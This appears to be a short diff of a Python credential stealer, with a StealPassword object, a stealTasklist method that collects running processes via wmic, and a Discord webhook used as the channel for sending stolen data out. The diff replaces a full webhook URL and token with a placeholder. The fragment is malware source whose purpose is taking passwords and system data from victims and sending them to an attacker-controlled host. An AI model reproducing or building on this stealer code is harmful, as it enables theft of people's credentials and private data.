@@ -8,7 +8,7 @@ StealPassword = StealPassword()
 
 class Functions:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/1197522282143305828/BdQ3v0V3YpjsPd-Are2VBfMrotFq2GVw9WqHHeJJrsrBrAfF8nro5X8fpbHGoPC7SSXS"
+        self.webhook = "WEBHOOK_URL"
 
     def stealTasklist(self):
         data = subprocess.check_output(['wmic', 'process', 'list', 'brief'])
